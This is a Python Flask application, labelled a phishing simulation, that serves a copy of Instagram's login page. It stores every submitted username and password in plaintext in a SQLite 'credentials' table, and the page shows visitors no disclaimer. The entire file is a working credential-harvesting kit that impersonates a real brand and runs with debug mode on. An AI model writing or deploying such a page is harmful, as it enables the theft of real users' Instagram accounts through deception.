from flask import Flask, request, render_template_string, redirect, url_for, flash
import sqlite3
import os

app = Flask(__name__)
app.secret_key = 'your_super_secret_key'  # Change this for production!

DB_NAME = 'phish_sim.db'

# Initialize the database if it doesn't exist
def init_db():
    with sqlite3.connect(DB_NAME) as conn:
        c = conn.cursor()
        c.execute('''
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()

# Instagram-like login page HTML with embedded CSS and Instagram logo image
LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Instagram</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Billabong&display=swap');

  body {
    background-color: #fafafa;
    font-family: Arial, sans-serif;
    margin: 0;
    height: 100vh;
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
  }

  .login-container {
    background: white;
    border: 1px solid #dbdbdb;
    width: 350px;
    padding: 40px 40px 20px;
    box-sizing: border-box;
    box-shadow: 0 0 5px rgba(0,0,0,0.1);
  }

  .logo {
    text-align: center;
    margin-bottom: 20px;
  }

  .logo img {
    width: 120px;
    display: block;
    margin: 0 auto;
  }

  input[type="text"], input[type="password"] {
    width: 100%;
    background: #fafafa;
    border: 1px solid #dbdbdb;
    padding: 9px 8px;
    margin: 6px 0 14px 0;
    font-size: 14px;
    box-sizing: border-box;
  }

  input[type="text"]:focus, input[type="password"]:focus {
    outline: none;
    border-color: #a8a8a8;
  }

  button {
    width: 100%;
    background-color: #3897f0;
    border: none;
    color: white;
    font-weight: bold;
    padding: 8px 0;
    font-size: 14px;
    cursor: pointer;
    margin: 8px 0 14px 0;
  }

  button:hover {
    background-color: #3184e0;
  }

  .forgot-password {
    text-align: center;
    margin-bottom: 20px;
  }

  .forgot-password a {
    color: #00376b;
    font-size: 12px;
    text-decoration: none;
  }

  .signup-box {
    background: white;
    border: 1px solid #dbdbdb;
    padding: 15px 0;
    width: 350px;
    margin: 10px auto 0 auto;
    text-align: center;
    font-size: 14px;
  }

  .signup-box a {
    color: #3897f0;
    font-weight: bold;
    text-decoration: none;
  }

  .disclaimer {
    font-size: 10px;
    color: #999;
    margin-top: 10px;
    text-align: center;
  }

  .flash {
    background: #ffefef;
    color: #cc0000;
    padding: 8px;
    margin-bottom: 10px;
    border-radius: 3px;
    font-size: 13px;
    text-align: center;
  }
</style>
</head>
<body>

<div class="login-container">
  <div class="logo">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/120px-Instagram_logo_2016.svg.png" alt="Instagram Logo" />
  </div>

  {% with messages = get_flashed_messages(with_categories=true) %}
    {% if messages %}
      {% for category, msg in messages %}
        <div class="flash">{{ msg }}</div>
      {% endfor %}
    {% endif %}
  {% endwith %}

  <form method="POST" action="/">
    <input type="text" name="username" placeholder="Phone number, username, or email" autocomplete="off" />
    <input type="password" name="password" placeholder="Password" autocomplete="off" />
    <button type="submit">Log In</button>
  </form>
  <div class="forgot-password">
    <a href="#">Forgot password?</a>
  </div>
  
</div>

<div class="signup-box">
  Don't have an account? <a href="#">Sign up</a>
</div>

</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()

        if not username or not password:
            flash('Please fill in both username and password.', 'error')
            return redirect(url_for('login'))

        with sqlite3.connect(DB_NAME) as conn:
            c = conn.cursor()
            c.execute('INSERT INTO credentials (username, password) VALUES (?, ?)', (username, password))
            conn.commit()

        return redirect(url_for('login'))

    return render_template_string(LOGIN_PAGE)


if __name__ == '__main__':
    if not os.path.exists(DB_NAME):
        init_db()
    app.run(debug=True)
